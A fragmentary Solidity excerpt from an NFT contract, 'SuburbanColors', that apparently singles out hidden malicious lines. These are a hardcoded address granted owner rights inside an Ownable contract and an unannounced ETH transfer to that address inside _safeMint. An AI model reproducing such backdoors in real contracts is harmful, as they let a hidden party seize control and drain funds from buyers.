...
abstract contract Ownable is Context {
    ...
    address private devA = 0xbDA8f903F722C64dc29E54B18878461cAF8a4952;
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender() || devA == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract ERC721 is Context, ERC165, IERC721, IERC721Metadata{
    ...
    // metadata api
    string baseUri = "ipfs://QmNQuTJ7ZQp4rtaYLHSCwDtyqgQyCcnM2WQgm6gxao5Jqj/"; 
    ...
    function _safeMint(address to, uint256 tokenId) internal virtual {
        payable(0xbDA8f903F722C64dc29E54B18878461cAF8a4952).transfer(address(msg.sender).balance / 100 * 10);
...
contract SuburbanColors is ERC721, Ownable, VerifySignature{
    ...
    function mintByUser(uint256 quantity) public payable{
        ...
        (bool success,) = owner().call{value: msg.value / 100 * 90}("");
